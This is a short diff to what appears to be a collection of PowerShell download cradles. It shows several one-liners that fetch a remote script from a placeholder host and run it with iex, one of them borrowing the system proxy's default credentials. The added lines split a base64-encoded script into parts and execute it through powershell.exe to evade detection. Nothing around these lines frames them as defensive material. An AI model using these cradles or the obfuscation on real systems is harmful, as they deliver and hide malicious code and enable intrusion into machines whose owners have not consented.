@@ -41,3 +41,9 @@ $req=[System.Net.HttpWebRequest]::Create("http://example.com/s.ps1");$res=$req.G
 [System.AppDomain]::CurrentDomain.SetData("APP_CONFIG_FILE", $null);$wc=New-Object Net.WebClient;iex $wc.DownloadString("http://example.com/s.ps1")
 
 $wc=New-Object System.Net.WebClient;$wc.Proxy=[System.Net.WebRequest]::GetSystemWebProxy();$wc.Proxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials;iex $wc.DownloadString("http://example.com/s.ps1")
+
+$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes((Get-Content .\script.ps1 -Raw)))
+$part1 = $encoded.Substring(0, 8000)
+$part2 = $encoded.Substring(8000)
+
+powershell.exe -NoProfile -Command "`$code='$part1'+'$part2'; iex ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(`$code)))"
